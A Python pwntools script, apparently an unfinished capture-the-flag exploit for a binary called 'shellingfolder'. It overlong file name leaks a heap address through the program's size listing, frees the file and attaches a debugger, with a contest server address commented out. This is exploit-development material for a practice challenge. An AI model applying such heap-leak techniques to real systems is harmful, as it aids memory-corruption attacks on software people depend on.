#!/usr/bin/python 
from pwn import *

#current_fold=0x202020

class mypwn(object):
	def __init__(self,io):
		self.io=io
		self.elf=ELF("./shellingfolder")
		#libc="./libc.so"
		#self.elf=ELF(libc)

	def debug(self):
		sc=''
		#sc='x /30x '+hex(current_fold)
		pwnlib.gdb.attach(self.io,sc)

	def new_folder(self,name):
		io=self.io
		io.recvuntil("Your choice:")
		io.sendline("3")
		io.recvuntil("Name of Folder:")
		io.send(name)

	def new_file(self,name,size):
		io=self.io
		io.recvuntil("Your choice:")
		io.sendline("4")
		io.recvuntil("Name of File:")
		io.send(name)
		io.recvuntil("Size of File:")
		io.send(str(size))

	def puts_size(self):
		io=self.io
		io.recvuntil("Your choice:")
		io.sendline("6")

	def cd(self,name):
		io=self.io

	def leak_heap(self):
		io=self.io
		io.recvuntil("nnnnnnnnnnnnnnnnnnnnnnnn")
		content=io.recvuntil(":")[1:6]
		rate=256
		addr=0
		for t in content:
			addr+=rate*ord(t)
			rate*=256
		self.heap_start=addr
		return addr

	def free(self,name):
		io=self.io
		io.recvuntil("Your choice:")
		io.sendline("5")
		io.recvuntil("Choose a Folder or file :")
		io.sendline(name)


	def run(self):
		#self.new_folder("a"*31)
		name=0x19*"n"
		self.new_file(name,12)
		self.puts_size()
		self.leak_heap()
		self.free(name)
		self.debug()
		pass

io=process("./shellingfolder")
#io=remote("202.120.7.107",60003)
p=mypwn(io)
p.run()
io.interactive()